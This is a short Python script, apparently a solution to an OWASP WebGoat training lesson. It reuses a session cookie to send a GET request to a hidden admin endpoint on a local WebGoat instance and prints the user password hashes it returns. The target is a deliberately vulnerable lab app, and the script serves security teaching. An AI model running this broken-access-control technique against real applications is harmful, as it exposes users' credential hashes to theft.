##################################################
## Python script for fetching user hashes via GET request from hidden admin URL
##################################################
## Author: Micah Wieburg
## License: MIT License
## Copyright: Copyright (c) 2024 mwieburg
## Project: OWASP Webgoat

import requests
import sys

try:
   #Assign script parameters to variables
   sessionID = sys.argv[1]
   #Define headers
   headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/json',
		 'Cookie':'JSESSIONID='+str(sessionID),
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
      }
   #Send Get request to retrieve user hashes
   response = requests.get('http://localhost:8080/WebGoat/access-control/users',timeout=5, headers=headers)
   data = response.json()
   print(data)

except Exception as error:
  print("An exception occured:", error)
